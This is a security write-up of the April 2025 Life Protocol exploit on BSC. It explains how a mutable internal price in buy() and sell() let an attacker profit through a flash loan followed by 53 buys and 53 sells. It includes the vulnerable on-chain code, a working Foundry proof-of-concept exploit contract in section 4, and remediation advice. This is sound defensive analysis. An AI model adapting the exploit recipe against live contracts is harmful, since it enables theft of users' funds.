# Life Protocol — Price Manipulation via Repeated buy/sell Analysis

| Field | Details |
|------|------|
| **Date** | 2025-04-28 |
| **Protocol** | Life Protocol |
| **Chain** | BSC |
| **Loss** | 15,114 BUSD |
| **Attacker** | [0x3026c464d3bd6ef0ced0d49e80f171b58176ce32](https://bscscan.com/address/0x3026c464d3bd6ef0ced0d49e80f171b58176ce32) |
| **Attack Tx** | [0x487fb71e...](https://bscscan.com/tx/0x487fb71e3d2574e747c67a45971ec3966d275d0069d4f9da6d43901401f8f3c0) |
| **Vulnerable Contract** | [0x42e2773508e2ae8ff9434bea599812e28449e2cd](https://bscscan.com/address/0x42e2773508e2ae8ff9434bea599812e28449e2cd) |
| **Root Cause** | The price calculation in the buy/sell functions relies on a manipulable internal spot price |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-04/Lifeprotocol_exp.sol) |

---

## 1. Vulnerability Overview

Life Protocol's `buy()` / `sell()` functions used an internal spot price to calculate the exchange rate between BUSD and LIFE tokens. The attacker borrowed 110,000 BUSD via a DODO flash loan, then repeatedly cycled through 53 `buy(1000 BUSD → LIFE)` calls followed by 53 `sell(LIFE → BUSD)` calls, accumulating small arbitrage profits from price slippage on each cycle.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable buy/sell: spot price-based exchange rate
contract LifeProtocol {
    function buy(uint256 lifeTokenAmount) external {
        // ❌ Price calculation based on current pool state (manipulable)
        uint256 busdRequired = lifeTokenAmount * getCurrentPrice();
        IERC20(BUSD).transferFrom(msg.sender, address(this), busdRequired);
        IERC20(lifeToken).transfer(msg.sender, lifeTokenAmount);
        // ❌ Internal price not immediately updated → favorable for next buy
    }

    function sell(uint256 amount) external {
        uint256 busdReturn = amount * getCurrentPrice();
        IERC20(lifeToken).transferFrom(msg.sender, address(this), amount);
        IERC20(BUSD).transfer(msg.sender, busdReturn);
    }
}

// ✅ Fixed code: slippage protection and cooldown
contract LifeProtocol {
    uint256 public lastTradeBlock;

    function buy(uint256 lifeTokenAmount) external {
        require(block.number > lastTradeBlock, "One trade per block"); // ✅
        lastTradeBlock = block.number;
        // Use AMM-based price calculation
    }
}
```

### On-Chain Original Code

Source: **Etherscan-verified** (V2 API, chainid 56) — LifeProtocolContract 0x42e2773508e2ae8ff9434bea599812e28449e2cd

```solidity
uint256 public currentPrice; // ❌ mutable state variable — updated after each buy

function calculateTotalCost(uint256 _lifeAmount) public view returns (uint256) {
    return (_lifeAmount.mul(currentPrice)).div(1e18); // ❌ uses live currentPrice
}

function buy(uint256 lifeTokenAmount) external nonReentrant {
    uint256 totalUsdtCost = calculateTotalCost(lifeTokenAmount); // ❌ cost at current (manipulable) price
    require(totalUsdtCost >= minTradeAmount && totalUsdtCost <= maxTradeAmount, "Invalid trade amount");

    buyBackReserve = buyBackReserve.add(totalUsdtCost);

    require(UsdtToken.transferFrom(msg.sender,address(this),totalUsdtCost),"usdt transfer failed!");

    uint256 contractTokenBalance = lifeToken.balanceOf(address(this));
    uint256 availableSupply = contractTokenBalance > queueSupply ? contractTokenBalance.sub(queueSupply) : 0;
    uint256 deficit = 0;

    if (availableSupply >= lifeTokenAmount) {
        buyFromSupply(msg.sender, lifeTokenAmount);
    } else {
        deficit = lifeTokenAmount.sub(availableSupply);
        if (availableSupply > 0) {
            buyFromSupply(msg.sender, availableSupply);
        }
        buyFromSellOrders(msg.sender, deficit);
    }
    buyBack();
    handleRatio(totalUsdtCost); // ❌ updates currentPrice after each buy
}

function handleRatio(uint256 _amount) internal {
    uint256 circulatingSupply = lifeToken.totalSupply().sub(lifeToken.balanceOf(address(this)));
    uint256 circulatingSupplyValue = (circulatingSupply.mul(currentPrice)).div(1e18);

    if (buyBackReserve > circulatingSupplyValue) {
        uint256 newPrice = (buyBackReserve.mul(1e18)).div(circulatingSupply);
        currentPrice = newPrice; // ❌ price rises when buyBackReserve grows from repeated buys
        emit PriceAdjusted(newPrice);
    }else{
        uint256 priceIncrease = calculatePriceIncrease(_amount);
        currentPrice = currentPrice.add(priceIncrease); // ❌ monotonically increasing with each buy
    }
}

function sell(uint256 amount) external nonReentrant {
    require(lifeToken.balanceOf(msg.sender) >= amount, "Insufficient balance");

    bytes32 sellOrderId = generateSellOrderId();
    bytes32 previousOrderId = currentSellOrderId;

    uint256 sellPrice = currentPrice.mul(90).div(100); // ❌ uses elevated post-buy currentPrice
    uint256 requiredUSDT = sellPrice.mul(amount).div(1e18);
    require(requiredUSDT >= minTradeAmount && requiredUSDT <= maxTradeAmount, "Invalid  Usdt trade amount");

    sellOrders[sellOrderId] = SellOrder({
        sellOrderId: sellOrderId,
        amount: amount,
        price: sellPrice,
        previous: previousOrderId,
        next: bytes32(0),
        seller: msg.sender,
        canceled: false,
        bought: false
    });

    if (UsdtToken.balanceOf(address(this)) >= requiredUSDT) {

        lifeToken.transferFrom(msg.sender, address(this), amount);
        remainingSupply = remainingSupply.add(amount);
        buyBackReserve = buyBackReserve.sub(requiredUSDT);
        require(UsdtToken.transfer(msg.sender,requiredUSDT),"usdt transfer failed!"); // ❌ pays at elevated price
        sellOrders[sellOrderId].bought = true;
        if (sellOrders[previousOrderId].next == sellOrderId) {
            currentSellOrderId = sellOrders[sellOrderId].next;
        }

        emit SellOrderCompleted(sellOrderId, msg.sender);
    } else {
        // ... queued sell order path (not exploited path) ...
    }
    buyBack();
}

function getCurrentPrice() external view returns (uint256) {
    return currentPrice;
}
```

**Why it is exploitable (identify the bug from the code):**

- `currentPrice` is a mutable state variable updated by `handleRatio()` after every `buy()`. Each purchase raises the price via `calculatePriceIncrease(_amount)` or the `buyBackReserve > circulatingSupplyValue` branch.
- An attacker with flash-loan capital calls `buy(1000e18)` 53 times, each incrementally raising `currentPrice`. They then call `sell(1000e18)` 53 times — `sell()` computes `sellPrice = currentPrice.mul(90).div(100)` using the now-elevated `currentPrice`, receiving more USDT per LIFE unit than they paid during the buy phase.
- Both `buy()` and `sell()` have `nonReentrant` but no per-block limit and no TWAP — each call within the same flash-loan transaction sees the updated `currentPrice` from prior calls, enabling a purely sequential (not reentrant) accumulation of profit.
- The flash-loan provides the 110,000 BUSD capital needed to make this repeated cycle profitable even after repayment.

```solidity
// ✅ Fix: enforce one trade per block and use an AMM pricing curve that is
//    not monotonically exploitable via repeated same-block calls
function buy(uint256 busdAmount) external nonReentrant {
    require(lastTradeBlock[msg.sender] < block.number, "One trade per block"); // ✅
    lastTradeBlock[msg.sender] = block.number;
    // use constant-product AMM pricing, not monotonically-increasing currentPrice
    uint256 lifeAmount = _getAmountOut(busdAmount, busdReserve, lifeReserve);
    busdReserve += busdAmount;
    lifeReserve -= lifeAmount;
    lifeToken.transfer(msg.sender, lifeAmount);
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─► DODO Flash Loan (borrow 110,000 BUSD)
  │
  ├─[2]─► Loop 53 times:
  │         └─► LifeProtocol.buy(1000 BUSD)
  │               └─► Buy LIFE tokens with 1000 BUSD
  │               └─► Price increases slightly with each purchase
  │
  ├─[3]─► Loop 53 times:
  │         └─► LifeProtocol.sell(LIFE tokens)
  │               └─► Sell LIFE → BUSD
  │               └─► Realize profit from accumulated slippage
  │
  ├─[4]─► Repay DODO Flash Loan (110,000 BUSD)
  │
  └─[5]─► Net profit: 15,114 BUSD
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract LifeProtocol_exp is Test {
    uint256 public quoteAmount = 110000 * 1e18;

    function testExploit() public {
        // [1] Borrow BUSD via DODO flash loan
        IFS(dpp).flashLoan(0, quoteAmount, address(this), abi.encodePacked(uint256(1)));
        console2.log("Profit:", IFS(busd).balanceOf(address(this)) / 1e18, 'BUSD');
    }

    function DPPFlashLoanCall(
        address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) public {
        // [2] 53 buy cycles
        for (uint256 i = 0; i < 53; i++) {
            IFS(LifeProtocolContract).buy(1000 * 1e18);
            // Internal price shifts slightly with each purchase
        }

        // [3] 53 sell cycles
        for (uint256 i = 0; i < 53; i++) {
            IFS(LifeProtocolContract).sell(1000 * 1e18);
            // Realize arbitrage profit from accumulated price difference
        }

        // [4] Repay flash loan
        IFS(busd).transfer(dpp, quoteAmount);
        // Remaining BUSD is net profit
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Price Manipulation / Sandwich Attack Variant |
| **Attack Technique** | Flash Loan + Repeated buy/sell cycles |
| **DASP Category** | Price Oracle Manipulation |
| **CWE** | CWE-682: Incorrect Calculation |
| **Severity** | High |
| **Attack Complexity** | Low-Medium |

## 6. Remediation Recommendations

1. **One trade per block limit**: Restrict the same address from calling buy/sell multiple times within the same block.
2. **Maximum single transaction amount limit**: Cap the maximum amount per individual buy/sell.
3. **AMM-based pricing**: Use a validated AMM (Uniswap V2/V3) price curve instead of direct price calculation.
4. **Transaction fees**: Design a fee structure that makes repeated trading economically unviable.

## 7. Lessons Learned

- **Repeated trade attacks**: Even small per-trade profits become significant when repeated with flash loan capital.
- **Significance of 53 iterations**: The attacker pre-calculated the optimal number of repetitions to maximize profit.
- **Simple protocols are not inherently safe**: Even a straightforward buy/sell mechanism can be vulnerable when combined with flash loans.